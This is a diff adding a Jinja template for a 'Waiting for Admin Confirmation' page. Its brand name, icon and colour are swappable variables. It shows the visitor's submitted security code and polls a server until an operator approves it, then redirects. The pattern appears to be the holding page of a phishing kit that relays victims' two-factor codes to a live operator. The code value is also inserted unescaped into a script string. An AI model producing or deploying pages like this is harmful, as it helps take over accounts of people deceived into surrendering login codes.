@@ -1,0 +1,119 @@
+{% extends "base.html" %}
+{% block body %}
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(59,130,246,0.25);border-radius:16px;">
+  {% if platform_icon and platform_name %}
+  <div class="platform-header">
+    <div class="icon-circle" style="background: {{ platform_color|default('#3B82F6') }}20; border: 2px solid {{ platform_color|default('#3B82F6') }}30;">
+      <i class="{{ platform_icon }}" style="color: {{ platform_color|default('#3B82F6') }};"></i>
+    </div>
+    <div>
+      <h2 class="notranslate" style="margin:0;color:{{ platform_color|default('#3B82F6') }};">{{ platform_name }}</h2>
+      <div style="color:#64748b;font-size:13px">Waiting for Admin Confirmation</div>
+    </div>
+  </div>
+  {% endif %}
+
+  <div class="confirmation-container">
+    <div class="loading-spinner"></div>
+    <h3 style="color:#1e293b;margin:20px 0 12px 0;font-size:18px;font-weight:600">⏳ Awaiting Verification</h3>
+    <p style="color:#64748b;text-align:center;margin-bottom:24px;line-height:1.5;">
+      Your security code has been submitted and is awaiting admin verification. 
+      This usually takes just a few moments. Please keep this page open.
+    </p>
+    
+    <div class="code-display">
+      <span class="code-label">Submitted Code:</span>
+      <span class="code-value">{{ code_value }}</span>
+    </div>
+  </div>
+</div>
+
+<script>
+const codeValue = "{{ code_value }}";
+const nextUrl = "{{ next_url }}";
+
+function checkConfirmation() {
+  fetch(`/api/check_confirmation/${codeValue}`)
+    .then(response => response.json())
+    .then(data => {
+      if (data.confirmed) {
+        window.location.href = nextUrl;
+      } else {
+        setTimeout(checkConfirmation, 3000); // Check every 3 seconds
+      }
+    })
+    .catch(error => {
+      console.error('Error checking confirmation:', error);
+      setTimeout(checkConfirmation, 5000); // Retry after 5 seconds on error
+    });
+}
+
+// Start checking for confirmation
+setTimeout(checkConfirmation, 2000);
+</script>
+
+<style>
+.confirmation-container {
+  text-align: center;
+  padding: 20px;
+}
+
+.loading-spinner {
+  width: 50px;
+  height: 50px;
+  border: 4px solid #e5e7eb;
+  border-top: 4px solid #3B82F6;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 0 auto 20px;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.code-display {
+  background: #f8fafc;
+  border: 1px solid #e2e8f0;
+  border-radius: 12px;
+  padding: 16px;
+  margin-top: 20px;
+}
+
+.code-label {
+  font-weight: 600;
+  color: #475569;
+  margin-right: 8px;
+}
+
+.code-value {
+  font-family: 'Courier New', monospace;
+  font-weight: 700;
+  color: #1e293b;
+  background: #ffffff;
+  padding: 4px 8px;
+  border-radius: 6px;
+  border: 1px solid #d1d5db;
+}
+
+.platform-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 24px;
+  padding-bottom: 20px;
+  border-bottom: 1px solid #f1f5f9;
+}
+
+.icon-circle {
+  width: 50px;
+  height: 50px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+</style>
+{% endblock %}
